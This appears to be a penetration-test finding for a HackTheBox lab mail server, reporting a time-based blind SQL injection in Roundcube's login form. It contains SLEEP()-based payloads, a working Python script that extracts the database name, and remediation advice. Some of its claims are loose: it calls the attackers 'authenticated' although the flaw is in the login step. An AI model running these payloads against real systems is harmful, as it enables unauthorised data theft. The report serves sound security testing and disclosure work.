# SQL Injection in Roundcube Login Endpoint

**ID:** vuln-0004
**Severity:** HIGH
**Found:** 2026-02-24 19:46:44 UTC
**Target:** mail.outbound.htb
**Endpoint:** /?_task=login
**Method:** POST
**CWE:** CWE-89
**CVSS:** 8.3

## Description

A time-based blind SQL injection vulnerability exists in the _user parameter of the login form at /?_task=login. The application fails to properly sanitize user-supplied input, allowing authenticated attackers to execute arbitrary SQL queries. The vulnerability is confirmed via SLEEP() delays and can be exploited to extract sensitive database information.

## Impact

An attacker with valid credentials (or via brute-forcing the login) can:
- Extract database schema, usernames, password hashes, and configuration data
- Potentially escalate privileges via stored data (e.g., if database user has higher privileges)
- Enumerate the backend database structure and contents
- Use extracted password hashes to attempt offline cracking and pivot to other systems
The impact is severe given the exposure of all stored email credentials and potentially password reuse.

## Technical Analysis

The Roundcube login processing code directly interpolates the _user parameter into a SQL query without using prepared statements or proper escaping. By injecting a payload like `tyler' AND IF(condition, SLEEP(4), 0)-- -`, an attacker can induce time delays that confirm the injection. The application returns HTTP 401 on failed logins regardless of the internal query result, which means error-based extraction is not feasible, but boolean/time-based exploitation works reliably. The session cookie and CSRF token are required for each request, but these can be obtained prior to each test. The database user likely has privileges to read the roundcube_users table, enabling credential theft.

## Proof of Concept

To reproduce:
1. Obtain a valid login page and extract the CSRF token from the _token field.
2. Send a POST request to /?_task=login with _user set to a time-based payload, e.g., `tyler' AND IF(1=1, SLEEP(4), 0)-- -`.
3. Observe the response time: a delay of ~4 seconds confirms the injection is functional.
4. Extract the database name character by character using SUBSTRING() comparisons.
Example PoC code is provided in the script below.

```
import requests
import re
import time
import string

url = "http://mail.outbound.htb/"
s = requests.Session()

def get_token():
    login_page = s.get(url + "?_task=login")
    m = re.search(r'name="_token" value="([^"]+)"', login_page.text)
    return m.group(1) if m else None

def test(payload, token):
    data = {
        "_task": "login",
        "_action": "login",
        "_token": token,
        "_user": payload,
        "_pass": "x",
        "_timezone": "UTC"
    }
    start = time.time()
    try:
        r = s.post(url, data=data, timeout=25)
        return time.time() - start >= 3
    except:
        return False

# Extract DB name
db_len = None
for l in range(1, 32):
    t = get_token()
    if test(f"tyler' AND IF(LENGTH(DATABASE())={l}, SLEEP(4), 0)-- -", t):
        db_len = l
        print(f"DB name length: {l}")
        break

chars = ""
if db_len:
    for pos in range(1, db_len+1):
        for c in string.printable:
            t = get_token()
            if test(f"tyler' AND IF(SUBSTRING(DATABASE(),{pos},1)='{c}', SLEEP(4), 0)-- -", t):
                chars += c
                print(f"pos {pos}: {c} -> {chars}")
                break

print(f"Database name: {chars}")
```

## Remediation

1. Use prepared statements with parameterized queries for all database interactions; do not interpolate user input into SQL strings.
2. Apply input validation on the _user field (e.g., allow only expected characters like alphanumeric, dot, underscore).
3. Upgrade to the latest Roundcube version which includes fixes for known SQLi vulnerabilities (CVE-2023-42071).
4. Consider implementing a WAF rule to block SQL injection patterns in login forms.
5. Conduct a thorough code review to identify and remediate any similar SQL injection flaws in other queries.
